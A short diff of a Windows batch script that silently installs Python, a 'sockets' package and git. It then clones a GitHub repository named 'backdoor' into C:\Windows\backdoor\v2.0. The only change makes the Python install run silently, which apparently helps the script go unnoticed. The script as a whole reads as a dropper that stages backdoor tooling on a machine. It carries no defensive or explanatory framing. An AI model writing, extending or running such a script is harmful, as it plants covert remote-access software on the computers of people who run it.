@@ -1,5 +1,5 @@
 @echo off
-winget install python3.11 --accept-source-agreements
+winget install python3.11 --accept-source-agreements --silent
 pip install sockets
 winget install git --accept-source-agreements
 git clone https://github.com/Jevelin4k/backdoor/ C:\Windows\backdoor\v2.0
